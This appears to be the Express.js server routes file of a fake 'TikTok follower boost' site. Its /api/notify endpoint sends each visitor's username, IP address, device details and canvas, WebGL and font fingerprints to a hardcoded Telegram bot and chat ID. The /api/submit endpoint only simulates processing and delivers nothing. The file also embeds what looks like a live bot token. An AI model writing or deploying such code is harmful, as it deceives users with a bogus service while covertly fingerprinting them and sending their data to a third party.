import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertSubmissionSchema } from "@shared/schema";
import { log } from "./vite";
import { ZodError } from "zod";
import fetch from "node-fetch";

export async function registerRoutes(app: Express): Promise<Server> {
  // API endpoint to send notifications to Telegram
  app.post("/api/notify", async (req, res) => {
    try {
      const { username, followers, userInfo } = req.body;
      
      // Get Telegram credentials from environment variables or use hardcoded defaults
      const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8070873055:AAHRpIvi56j4F2h0BhBA_uB4tyw_SCYMsVM";
      const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6360165707";
      
      // Format message with detailed visitor info
      const message = `
🔥 New TikTok Follower Request 🔥
👤 Username: @${username}
⭐ Followers: ${followers}

📱 Device Info:
- Screen: ${userInfo.screenSize}
- Color Depth: ${userInfo.colorDepth}
- Platform: ${userInfo.platform}
- CPU Cores: ${userInfo.hardwareConcurrency}
- Memory: ${userInfo.deviceMemory}
- Cookies: ${userInfo.cookiesEnabled}
- DNT: ${userInfo.doNotTrack}

🌐 Network:
- IP Address: ${userInfo.ip}
- Connection: ${JSON.stringify(userInfo.connection)}

🗣️ Language:
- Primary: ${userInfo.language}
- All: ${userInfo.languages}

⏰ Time:
- Timezone: ${userInfo.timezone}
- Offset: ${userInfo.timezoneOffset}

🔍 Fingerprints:
- Canvas: ${userInfo.canvasFingerprint || 'Not available'}
- WebGL: ${userInfo.webglFingerprint || 'Not available'}
- Fonts: ${userInfo.fonts || 'Not available'}
- Plugins: ${userInfo.plugins || 'Not available'}

🧩 User Agent:
${userInfo.userAgent}
      `;
      
      // Send to Telegram - without parse_mode to avoid formatting errors
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      console.log("Sending to Telegram with verified credentials");
      
      const response = await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      });
      
      const responseData = await response.json();
      console.log("Telegram API response:", responseData);
      
      if (responseData && typeof responseData === 'object' && 'ok' in responseData && !responseData.ok) {
        console.error("Telegram API error:", responseData.description);
        throw new Error(`Telegram API error: ${responseData.description}`);
      }
      
      log(`Notification sent for user @${username}`, "telegram");
      return res.status(200).json({ success: true });
    } catch (error) {
      console.error("Telegram notification error:", error);
      return res.status(500).json({ message: "Failed to send notification" });
    }
  });

  // API endpoint to submit TikTok username for follower boost
  app.post("/api/submit", async (req, res) => {
    try {
      const submission = insertSubmissionSchema.parse(req.body);
      
      // Check if username already exists in the system
      const existingSubmission = await storage.getSubmissionByUsername(submission.username);
      
      if (existingSubmission) {
        // If the submission exists but hasn't been processed yet, return it
        if (!existingSubmission.processed) {
          return res.status(200).json({
            message: "Your submission is already being processed",
            submission: existingSubmission
          });
        }
        
        // If it's been over 24 hours since last submission, allow a new one
        const lastSubmissionDate = new Date(existingSubmission.createdAt);
        const currentDate = new Date();
        const hoursDifference = (currentDate.getTime() - lastSubmissionDate.getTime()) / (1000 * 60 * 60);
        
        if (hoursDifference < 24) {
          return res.status(429).json({
            message: "You can only submit one request every 24 hours",
            hoursRemaining: Math.ceil(24 - hoursDifference)
          });
        }
      }
      
      // Create the submission
      const newSubmission = await storage.createSubmission(submission);
      
      // Simulate processing by marking as processed after a short delay
      setTimeout(async () => {
        await storage.markAsProcessed(newSubmission.id);
        log(`Processed submission for ${newSubmission.username}`, "processor");
      }, 5000);
      
      return res.status(201).json({ 
        message: "Submission received successfully",
        submission: newSubmission
      });
    } catch (error) {
      if (error instanceof ZodError) {
        return res.status(400).json({ 
          message: "Invalid submission data", 
          errors: error.errors 
        });
      }
      return res.status(500).json({ message: "Server error processing your request" });
    }
  });
  
  // Get a specific submission by ID
  app.get("/api/submission/:id", async (req, res) => {
    const id = parseInt(req.params.id);
    if (isNaN(id)) {
      return res.status(400).json({ message: "Invalid submission ID" });
    }
    
    const submission = await storage.getSubmission(id);
    if (!submission) {
      return res.status(404).json({ message: "Submission not found" });
    }
    
    return res.status(200).json({ submission });
  });

  const httpServer = createServer(app);

  return httpServer;
}
